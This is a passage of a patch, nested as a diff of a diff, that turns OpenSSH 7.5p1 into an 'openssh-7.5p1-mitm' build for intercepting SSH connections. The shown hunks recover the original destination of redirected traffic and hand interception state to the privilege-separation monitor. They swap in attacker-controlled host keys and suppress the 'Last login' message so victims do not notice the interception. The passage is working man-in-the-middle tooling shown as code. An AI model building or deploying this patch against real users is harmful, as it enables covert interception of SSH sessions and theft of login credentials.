++	if (getsockopt(sock_in, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr *)&origaddr, &origaddr_len) != 0)
++	  fatal("%s: getsockopt failed.", __func__);
++
++	lol->original_host = strdup(inet_ntoa(origaddr.sin_addr));
++	lol->original_port = ntohs(origaddr.sin_port);
++#else
++	lol->original_host = strdup(DEBUG_HOST);
++	lol->original_port = DEBUG_PORT;
++#endif
++
+ 	/*
+ 	 * Register our connection.  This turns encryption off because we do
+ 	 * not have a key.
+@@ -2040,6 +2064,7 @@
+ 	 */
+ 	if (use_privsep) {
+ 		mm_send_keystate(pmonitor);
++		mm_send_lol(pmonitor, lol);
+ 		exit(0);
+ 	}
+ 
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
+--- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshd_config	2017-05-16 14:30:10.573184705 -0400
+@@ -15,17 +15,17 @@
+ #ListenAddress 0.0.0.0
+ #ListenAddress ::
+ 
+-#HostKey /etc/ssh/ssh_host_rsa_key
++HostKey /usr/local/etc/ssh_host_rsa_key
+ #HostKey /etc/ssh/ssh_host_dsa_key
+ #HostKey /etc/ssh/ssh_host_ecdsa_key
+-#HostKey /etc/ssh/ssh_host_ed25519_key
++HostKey /usr/local/etc/ssh_host_ed25519_key
+ 
+ # Ciphers and keying
+ #RekeyLimit default none
+ 
+ # Logging
+-#SyslogFacility AUTH
+-#LogLevel INFO
++SyslogFacility AUTH
++LogLevel INFO
+ 
+ # Authentication:
+ 
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
+--- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshlogin.c	2017-05-16 12:54:06.010464344 -0400
+@@ -113,7 +113,8 @@
+ 		else
+ 			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
+ 			    time_string, hostname);
+-		buffer_append(&loginmsg, buf, strlen(buf));
++		/* Suppress message about last login. */
++		/*buffer_append(&loginmsg, buf, strlen(buf));*/
+ 	}
+ # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */
+ #endif /* NO_SSH_LASTLOG */
+
